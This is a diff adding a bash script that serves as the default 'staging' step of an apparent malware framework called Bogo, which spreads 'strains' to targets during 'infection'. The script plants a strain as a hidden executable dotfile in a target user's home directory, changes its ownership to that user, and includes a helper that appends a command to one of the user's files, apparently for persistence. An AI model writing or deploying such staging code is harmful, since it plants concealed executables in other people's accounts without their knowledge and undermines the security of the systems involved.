@@ -1,0 +1,94 @@
+#!/bin/bash
+#
+# This is the default staging file that is executed if the strain
+# does not "require staging"
+#
+# It is HIGHLY recommended that each strain have a staging file associated
+# to it that is to be exeucted in place of this script.
+#
+# The default staging should only be called if the strain is extremely
+# simple, or if the intended goal is to simply copy something.
+#
+# Bogo "tests" a strain by executing it without arguments.
+# If there is a syntax error or something, it would fail
+#
+
+option=$1      # Bogo passes the option "prestage" during prestage,
+               # and "stage" during infection
+
+strain=$2      # This is the strain of wilde to be used
+
+target=$3      # This is the target to recieve the strain
+
+
+prestage()
+# This method would be executed when prestaging is called
+{
+	# Return 69 if you dont need prestaging
+	# Bogo will interpret any other return value as a failure
+	exit 69
+}
+
+get_target_type()
+{
+	target_type=""
+	[ -d $target ] &&  target_type="dir"
+	[ -e /home/$target ] && target_type="user"
+	[ -f $target ] && target_type="file"
+	[ -x $target ] && target_type="exec"
+	
+	if [[ -z $target_type ]]; then
+		echo "$target is not a valid type"
+		exit 1 # abort
+	fi
+}
+
+main()
+# This method would be executed when staging is called.
+# Bogo expects this method to handle the actual infection.
+# If it returns 0, Bogo assumes infection was successful.
+# If it returns anything else, Bogo assumes something went wrong.
+{
+	get_target_type
+	
+	case $target_type in
+		"dir")
+			echo "$target is a directory"
+			cp $strain $target;;
+		"user")
+			echo "$target is a user"
+			cp $strain "/home/$target/.$strain"
+			chown $target:$target "/home/$target/.$strain"
+			chmod 755 "/home/$target/.$strain";;
+		"file")
+			echo "$target is a file";;
+			
+		"exec")
+			echo "target is an executable";;
+		*)
+			return 1;;
+	esac
+	
+}
+
+prime()
+{
+	local file=$1
+	if [[ -e $target/$file ]]; then
+		echo "chmod +x /home/$target/.$strain" >> /home/$target/$file
+	fi
+}
+
+noargs()
+{
+	# We can do more sanity checks here if we wanted to
+	echo "all good"
+	exit 0
+}
+
+
+case $option in
+	"prestage") prestage;;
+	"stage") main;;
+	*) noargs;;
+esac
